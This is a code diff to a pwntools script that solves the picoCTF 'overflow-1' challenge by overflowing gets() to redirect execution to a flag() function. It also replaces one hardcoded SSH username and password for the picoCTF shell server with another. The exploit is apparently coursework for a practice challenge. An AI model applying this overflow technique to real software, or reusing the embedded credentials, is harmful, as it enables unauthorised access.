@@ -5,7 +5,7 @@ def hex_string_to_ascii_string(hexstring): # https://www.kite.com/python/answers
     return asciistring
 
 from pwn import *
-s=ssh(host="2019shell1.picoctf.com", user="Hohenheim10", password="mhw1015sz15,.")
+s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
 s.set_working_directory(wd=b"/problems/overflow-1_2_305519bf80dcdebd46c8950854760999")
 p = s.process("./vuln")
 
@@ -20,8 +20,9 @@ p = s.process("./vuln")
 # print(padding) # padding is 38 bytes
 
 # 2 find the address of the flag function
+# http://docs.pwntools.com/en/latest/elf/elf.html?highlight=elf
 e = ELF('./vuln_task3')
-flag_address = p32(e.symbols['flag']) # integer to bytes
+flag_address = p32(e.symbols['flag']) # https://docs.pwntools.com/en/stable/util/packing.html
 
 # 3 exploit the gets() function to overflow and override the return address of vuln() to the address of flag()
 p.sendlineafter("Give me a string and lets see what happens: \n",
